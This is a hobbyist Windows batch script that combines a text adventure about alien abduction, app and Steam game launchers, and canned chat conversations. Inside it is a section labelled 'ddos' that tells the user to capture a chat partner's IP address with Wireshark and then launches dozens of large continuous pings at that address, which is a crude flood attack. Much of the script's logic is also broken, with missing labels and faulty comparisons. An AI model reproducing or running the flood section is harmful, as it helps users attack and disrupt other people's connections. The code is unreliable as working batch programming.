echo Alians:we are the intergalactic police force
echo Alians:we would like you to join us
echo Alians:we have seen your amaechoing balls punching
echo Alians:we have seen great potential 
echo Alians:we will take you
pause
goto obduction2

:obduction2
echo             `:/ooo`                                                       
echo          `+ydddmNmd:                                                      
echo          dNNNMMMMMNms`                                                    
echo          hMMMMMMMMMNmhosso+/.                                             
echo          oMMMMMMMMMMMdNmMMmhd/                                            
echo        `:yMMMMMMMMNhys+hmMmdh.                                            
echo      `omMMmNNNNNmdh/syhmmmd+`                                             
echo      dMMMMmddddddmmmmmmNNNmdho-```````                                    
echo      +dmNMMMMMMMMMNNmmmmmmmmmmmddddddddhs/`                               
echo       `..:dNNNNNmmmmmmmmNNNNNNNNNNNNNNNNNm+                               
echo         .hmmmmmmmNNNNNmmdddddddmNNNNNNNNdo`                               
echo      .:odmmNNNNNmddhhyhhhhyyyyssNNNNNdy/.                                 
echo   ./ydmNNNNNmdhyhhhhhhyyyyyyyyhdmmhs:.                                    
echo `odmNNNNNNNmoyyyyyyyysyyyyhhhhys++-                                       
echo oNNNNNNNNNNmhhhhyhhhhhhyyso++//////:`                                     
echo .ohddddddddddhyyysoo++//////////////:-`                                   
echo    ``......``` .://///////////////////:.                                  
echo                 .://////////////////////:.                                
echo                  `:///////////////////////-`                              
echo                   `:///////////////////////:-`                            
echo                    `:////////////////////////:.                           
echo                     `://///////////////////////:`                         
echo                      -//////////////////////////-`                       
echo                        -//////////////////////////:.                      
echo `   `  `   `  `   `      -///////////////////////////:.                    
echo ::++os+ssooysshhyhhhys+odhdddddddddddddhhmddmdhmmdddhdhsyysso++++++++//:::.
echo.
echo human has been acquired!
echo ALIANS Out!
pause
goto spaceship

:spaceship
echo.
echo Comander:welcome human
echo Comander:we are Banakafalatans
echo Comander:we have TAKEN you
echo Billy:omfg its like that movie we saw last night
echo Comander:Billy shut it
echo Comander:The subject isnt apropriate
echo Comander:Nevermind Billy please
echo Comander:You will be taken for examination
echo Comander:afterwords if the producers have enough money
echo Comander:Will put you on a space advanture
pause
goto spaceadvanture

:spaceadvanture
echo Comander:you will be traned as the best
echo Comander:you will be seen as one of ours
echo Comander:there will be no compremises
echo Trainer:come with me
echo I will be training you
echo first you need to choose a weapon
echo Standard Blaster (1)/(4-preview)
echo Laser Sword      (2)/(4-preview)
echo Advanced Blaster (3)/(4-preview)
set /p chs6=
if %chs6%== 1 goto stb
if %chs6%== 2 goto lsw
if %chs6%== 3 goto adb
if %chs6%== 4 goto preview1

:lsw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc2
goto stb

:stb
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc
goto stb

:adw
echo Trainer:great choice
echo Trainer:now for our training
echo lets start off with learning how to use your weapon
echo press (1) to go to training center
set /p chs12=
if %chs12%== 1 goto trc3
goto adw

:trc3
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck20=Enter:
if %atck20%== 1 goto atc20
if %atck20%== 2 goto atc21
goto trc

:atc20 
echo Dummy health:100-65
echo standard attack (1)
echo advanced attack (2)
set /p atck21=Enter:
if %atck21%== 1 goto atc23
if %atck21%== 2 goto atc25

:atc21
echo Dummy health:100-65+10(ice ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck22=Enter:
if %atck22%== 1 goto atc26
if %atck22%== 2 goto atc27

:atc26
echo Dummy health:25-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt23=(Y/N):
if %cnt23%= Y goto spaceadvanture2
if %cnt23%= N goto exit
goto atc22 

:atc27
echo Dummy health:25-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt24=(Y/N):
if %cnt24%= Y goto spaceadvanture2
if %cnt24%= N goto exit
goto atc12

:atc23
echo Dummy health:35-65
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt25=(Y/N):
if %cnt25%= Y goto spaceadvanture2
if %cnt25%= N goto exit
goto atc22 

:atc25
echo Dummy health:35-65+10(ice ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt26=(Y/N):
if %cnt26%= Y goto spaceadvanture2
if %cnt26%= N goto exit
goto atc12

:trc2
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck2=Enter:
if %atck2%== 1 goto atc3
if %atck2%== 2 goto atc4
goto trc

:atc3 
echo Dummy health:100-40
echo standard attack (1)
echo advanced attack (2)
set /p atck3=Enter:
if %atck3%== 1 goto atc13
if %atck3%== 2 goto atc23

:atc4
echo Dummy health:100-40+10(fire ball)
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck4%== 1 goto atc14
if %atck4%== 2 goto atc24

:atc24
echo Dummy health:60-40+10(fire ball)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt8=(Y/N):
if %cnt8%= Y goto spaceadvanture2
if %cnt8%= N goto exit
goto atc22 

:atc14
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt9=(Y/N):
if %cnt9%= Y goto spaceadvanture2
if %cnt9%= N goto exit
goto atc12

:atc23
echo Dummy health:50-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt10=(Y/N):
if %cnt10%= Y goto spaceadvanture2
if %cnt10%= N goto exit
goto atc22 

:atc13
echo Dummy health:60-40
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt11=(Y/N):
if %cnt11%= Y goto spaceadvanture2
if %cnt11%= N goto exit
goto atc12

:trc
echo Trainer:welcome to the training center
echo Trainer:we have found a target for you to train on
echo Trainer:this is one of the best training dummies
echo Dummy health:100
echo standard attack (1)
echo advanced attack (2)
set /p atck=Enter:
if %atck%== 1 goto atc1
if %atck%== 2 goto atc2
goto trc

:atc1 
echo Dummy health:100-45
echo standard attack (1)
echo advanced attack (2)
set /p atck12=Enter:
if %atck12%== 1 goto atc12
if %atck12%== 2 goto atc22

:atc2
echo Dummy health:100-45+10(fire ammo)
echo standard attack (1)
echo advanced attack (2)
set /p atck13=Enter:
if %atck13%== 1 goto atc15
if %atck13%== 2 goto atc25

:atc25
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt14=(Y/N):
if %cnt14%= Y goto spaceadvanture2
if %cnt14%= N goto exit
goto atc22 

:atc15
echo Dummy health:45-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt15=(Y/N):
if %cnt15%= Y goto spaceadvanture2
if %cnt15%= N goto exit
goto atc12

:atc22
echo Dummy health:55-45+10(fire ammo)
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt16=(Y/N):
if %cnt16%= Y goto spaceadvanture2
if %cnt16%= N goto exit
goto atc22 

:atc12
echo Dummy health:55-45
echo Trainer:excelent
echo Trainer:great work back there
echo continue?
set /p cnt17=(Y/N):
if %cnt17%= Y goto spaceadvanture2
if %cnt17%= N goto exit
goto atc12

:preview1
echo (1)-standar blaster
echo (2)-laser sword
echo (3)-advanced blaster
set /p chs7=Enter:
if %chs7%== 1 goto preview2
if %chs7%== 2 goto preview3
if %chs7%== 3 goto preview4

:preview3
cls
echo          D  M  G:40
echo          S P E T I A L:fire ball 
echo.
echo                                   
echo                                                  ````````                 
echo                                              ```...----..`                
echo                                            `..----------.`                
echo                                         ``..------------.`                
echo                                       ``..-----....-----.`                
echo                                     ``..-----..``.-----.``                
echo                                   ``..--:---.``..-----.``                 
echo                                  `..-:::--.``..------.``                  
echo                                ``.-::::-.```..-----..`                    
echo                              ``.--:::-..``..--:---.``                     
echo                             `..-:::--.``..--:::-..`                       
echo                           ``.-::::-.```.--:::--.``                        
echo                          `.--:::-.```..-::::-.``                          
echo                        ``.--::--.```.--:::--.`                            
echo                       `..-::--.```.--:::--.``                             
echo                     ``.-----.```..-::::-.``                               
echo                    .:..---.```..--:::-..`                                 
echo                    `+o:-:.```.--:::--.`                                   
echo                     `-oo///-------..``                                    
echo                     `.+/+yo-.....``                                       
echo                    `::/o::-+o/.`                                          
echo                   .:/+/`    ```                                           
echo                  -/+-                                                     
echo               `:oo-                                                       
echo               `//-  
pause
goto spaceadvanture                                                      
                                                           
:preview2
cls
echo          D  M  G:45
echo          S P E T I A L:fire ammo
echo.
echo                                                                   
echo                   .-:`  ```                                               
echo       ```````.--:/yyyyosyyyo.````                                         
echo      /yyyyssyhhhhhhyyyhhddhs.```        ``                                
echo      -yyhhysssdmdosyyyoohhs``..--:://+osyo/``````........-------.....     
echo      `////.``.yhhhhhhhhhhyyyyyyyyyyyyhhddyyysys------..........------`    
echo        .sysyyyhhhhhhhhdddddhhhhhyoo+++syyyyyyyy:----::::::::::--.``       
echo    -oosshhhddddhhhhhhyyyyyyyyyyo//++++shhhyyyss/:---...`````              
echo    oyyhyyhyyyyhhhhhhhhhhhddddddyyy+--....``                               
echo    sdddddmdmdyssoyhydddhyhhyyy+/-/.                                       
echo    `ohyooo+/:    `yhdddyhhsoy-   `-                                       
echo     ```          `hdmdmhy-.-+. `..                                        
echo                 .yyyhdh:`   `.``                                          
echo                `hyyyyh-                                                   
echo               `hhyyyh-                                                    
echo               odyyyd-                                                     
echo               `+yhdd-                                                     
echo                  `..     
pause
goto spaceadvanture

:preview4                                                 
cls
echo          D  M  G:65    
echo          S P E T I A L:ice ammo
echo.
echo                       `::--..--..-+.`                                  
echo                        ``-ysydyyssyyyydo..```````                         
echo   ```     `://:///::/:oyyhoossdhdhyyhhmddddddhhhs/.``````..`              
echo  .yssssoo+yddyssyyyyyhmyhdyyhhdhdhhhyyhhyyyyyosyyhhyss++//++/-......`.``  
echo  :mhmmmmmmhh/://s///smmhhyhhyddddddhhhhhhyyysosysyysssoooso+y+++////-//:  
echo  +mhdmddddso/-::/--://++s+ssodmdyyhssysyyyyyssysddmmmmmmmdy-.```````````  
echo  sdyyhho:.`                `oyhhs-:``sssssooo/:-:--------:.               
echo `hhhhy:`                  `oyyyo.`.``-```````                             
echo  ....`                    +yhy+`                                          
echo                          `.:/`                                           
pause
goto spaceadvanture                                                                                                       

:spaceadvanture2
echo work in progres....
echo thank you for playing the closed alpha preview 
pause
exit

:viber1
start C:\Users\"fico pico"\AppData\Local\Viber\Viber.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:steam1
echo.
echo choose an option
echo         exit                             (exit)
echo         back                             (back)
echo start steam                               (1)
echo start Fallout New Vegas                   (2)
echo start Terraria                            (3)
echo start Castle Crashers                     (4)
echo start The Elder Scrolls V:Skyrim          (5) 
echo start Saints Row IV                       (6)
echo start Just Cause 2                        (7)
echo start Victor Vran                         (8)
echo start Left 4 Dead 2                       (9)
echo start Lego MARVEL Super Heroes            (10)
echo start Garry's Mod                         (11)
echo start Goat Simulator                      (12)
echo start A Story About My Uncle              (13)
echo start Scrap Mechanic                      (14)
echo start Borderlands:The Pre Sequel          (15)
echo start Hotline Miami                       (16)
echo start Dirt 3:Complete Edition             (17)
echo start Trine 2                             (18)
echo start One Finger Death Punch              (19)
echo start Castlevania:Lords of Shadow         (20)
echo start Far Cry 3                           (21)
echo start Super Meat Boy                      (22)
echo start Metal Gear Solid V:The Phantom Pain (23)
echo start The Witcher 3:Wild Hunt             (24)
echo start Euro Truck Simulator                (25)
echo start Battlefield 4                       (26)
echo start Crysis 3                            (27)
echo start Metro Last Ligh Redux               (28)
echo start Guacamelee Super Turbo Championship (29)
echo start Scribblenauts Unmasked              (30)
echo start Shadow Warrior 2                    (31)
echo start The Vanishing of Ethan Carter       (32)
echo start Tom Clancy's The Division           (33)
echo start Lego Batman 3                       (34)
echo start Just Cause 3                        (35)
echo start Rocket League                       (36)
echo start Tales from the Borderlands          (37)
echo start Sniper Elite 4                      (38)
echo start Grand Theft Auto V                  (39)
set /p g=ENTER:
if %g%==1 goto steam2
if %g%==2 goto s2
if %g%==3 goto s3
if %g%==4 goto s4
if %g%==5 goto s5
if %g%==6 goto s6
if %g%==7 goto s7
if %g%==8 goto s8
if %g%==9 goto s9
if %g%==10 goto s10
if %g%==11 goto s11
if %g%==12 goto s12
if %g%==13 goto s13
if %g%==14 goto s14
if %g%==15 goto s15
if %g%==16 goto s16
if %g%==17 goto s17
if %g%==18 goto s18
if %g%==19 goto s19
if %g%==20 goto s20
if %g%==21 goto s21
if %g%==22 goto s22
if %g%==23 goto s23
if %g%==24 goto s24
if %g%==25 goto s25
if %g%==26 goto s26
if %g%==27 goto s27
if %g%==28 goto s28
if %g%==29 goto s29
if %g%==30 goto s30
if %g%==31 goto s31
if %g%==32 goto s32
if %g%==33 goto s33
if %g%==34 goto s34
if %g%==35 goto s35
if %g%==36 goto s36
if %g%==37 goto s37
if %g%==38 goto s38
if %g%==39 goto s39
if %g%==back goto hl9k
if %g%==exit 

:s1
start "C:\Program Files (x86)\Steam\Steam.exe"
pause
:s2
start steam://rungameid/22490 
pause
:s3 
start steam://rungameid/105600 
pause
:s4 
start steam://rungameid/204360
pause
:s5
start steam://rungameid/72850
pause
:s6
start steam://rungameid/206420
pause
:s7
start steam://rungameid/8190
pause
:s8
start steam://rungameid/345180
pause
:s9
start steam://rungameid/550
pause
:s10
start steam://rungameid/249130
pause
:s11
start steam://rungameid/4000
pause
:s12
start steam://rungameid/265930
pause
:s13
start steam://rungameid/32500
pause
:s14
start steam://rungameid/278360
pause
:s15
start steam://rungameid/387990
pause
:s16
start steam://rungameid/219150
pause
:s17
start steam://rungameid/321040
pause
:s18
start steam://rungameid/35720
pause
:s19
start steam://rungameid/264200
pause
:s20
start steam://rungameid/234080
pause
:s21
start steam://rungameid/220240
pause
:s22
start steam://rungameid/40800
pause
:s23
start steam://rungameid/287700
pause
:s24
start steam://rungameid/292030
pause
:s25
start steam://rungameid/227300
pause
:s26
start "D:\Program Files (x86)\Origin Games\Battlefield 4\BF4X86WebHelper.exe"
pause
:s27
start "D:\Program Files (x86)\Origin Games\Crysis 3\bin32\Crysis3.exe"
pause
:s28
start steam://rungameid/287390
pause
:s29
start steam://rungameid/275390
pause
:30
start steam://rungameid/249870
pause
:s31
start steam://rungameid/324800
pause
:s32
start steam://rungameid/400430
pause
:s33
start steam://rungameid/365590
pause
:s34
start steam://rungameid/313690
pause
:s35
start steam://rungameid/225540
pause
:s36
start steam://rungameid/252950
pause
:s37
start steam://rungameid/330830
pause
:s38
start steam://rungameid/312660
pause
:s39
start steam://rungameid/271590
pause

:movie1
start telnet towel.blinkenlights.nl
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:skype1
echo.
start skype.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:mp3juices1
echo.
echo you have chosen musicfree
echo when the page opens type in the song you want in the search bar
echo then choose the song and click download  
start https://wwww.mp3juices.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:youtube1
echo.
echo you have chosen youtube 
start https://www.youtube.com/
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:10youtube
echo.
echo you have chosen videodownloader
echo after the page has loaded
echo in the search bar type in the video you want to download
echo then select the format you want to download it in
start https://10youtube.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:chrome1
echo.
start chrome.exe
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:matrix
echo.
echo thank you for using hall9000 services
echo type in matrix to begin
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p matirx123=
if %matirx123%== matrix goto delete
if %matirx123%== back goto hl9k
if %matirx123%== exit goto exit 

:ddos
echo.
echo what is the ip that you want to ddos
set /p ip=
echo is %ip% correct?
set /p thankyou=
if %thankyou%== yes goto ping
if %thankyou%== no goto ddos

:ddostool
echo.
echo before we begin to find someones ip you need to be talking to him on:
echo steam chat,skype,omegle
echo when you have done that type in continue
set /p cnt200=
if %cnt200%== continue goto instruction2

:instruction2
echo you will be provided with a program called wireshark
echo in the section called "using this fillter" type in "udp"
echo a lot of ip's will pop up
echo whait for about 10 seconds and click the red button on top
echo one of those will be someones ip
start wireshark.exe
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo laoding...
ping localhost -n 2 >nul
cls
echo connected
echo when you have the ip press any button to continue
pause
echo please insert the ip you whant to ddos
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%== continue goto ddosping

:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:hl9
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
cls
pause
echo hi there
echo this is the place where you choose
echo do you want to go with conversation1
echo or with conversation2
echo or with conversation3
echo conversation1 offers a nice conversation about videogames
echo conversation2 offers a conversation about movies
echo conversation3 offers a conversation about music
set /p choosen=
if %choosen%== conversation1 goto conversation1
if %choosen%== conversation2 goto conversation2
if %choosen%== conversation3 goto conversation3

:conversation3
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great3
if %emotion%== good goto good3
if %emotion%== bad goto bad3
if %emotion%== sad goto Sad3
if %emotion%== amaechoing goto amaechoing3
if %emotion%== fine goto fine3

:fine3
color 03
echo i guess thats not bad...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:amaechoing3
color 06
echo wonderfull,lets start
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:good3
color 3
echo thats nice
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:Sad3
color 5
echo whell i hope i will change that
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:bad3
color 4
echo thats bad to hear...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:great3
color 2
echo thats wonderfull
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:music123
echo.
echo you have chosen my music services
echo to download music for free type in musicfree
echo to play music start up fucking media player
echo to buy music,i dont know,i dont sell any 
echo to listen to music on youtube type in youtube
echo to download youtube videos type in videodownloader
set /p answergiven123=
if %answergiven123%== musicfree goto mp3juices
if %answergiven123%== youtube goto youtube2
if %answergiven123%== videodownloader goto 10youtube

:conversation2
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great2
if %emotion%== good goto good2
if %emotion%== bad goto bad2
if %emotion%== sad goto Sad2
if %emotion%== amaechoing goto amaechoing2
if %emotion%== fine goto fine2

:fine2
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:amaechoing2
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:great2
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:good2
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:Sad2
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:bad2
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:thoughts1
echo. 
echo so what did you think about it
echo did you like it?
set /p sqloved=
if %sqloved%== yes goto sqloved1
if %sqloved%== no goto sqloved2

:sqloved1
echo. 
echo whell thats your thoughts
echo i didnt 
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:sqloved2
echo. 
echo whell thats your thoughts
echo i didnt either
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:thoughts2
echo.
echo whell dont watch it
echo its a peace of shit movie
echo the rating are right for it
echo dont spend your time
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron man
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:whiplash1
echo.
echo wow,not many have wathced that one
echo but i love it
echo its amaechoing that someone else i can speak to has watched it too
echo whell that was it for now
echo we can continue our conversation another time
echo if you want to talk to me for longer choose conversation1
echo thank you for talking with me
echo and will see eachother later
echo bye
set /p idontlikethis=
if %idontlikethis%== bye goto bb8

:bb8
echo.
echo %random%

:conversation1
echo .
echo you have chosen conversation1
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great
if %emotion%== good goto good
if %emotion%== bad goto bad
if %emotion%== sad goto Sad
if %emotion%== amaechoing goto amaechoing
if %emotion%== fine goto fine

:fine
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:amaechoing
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:great
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
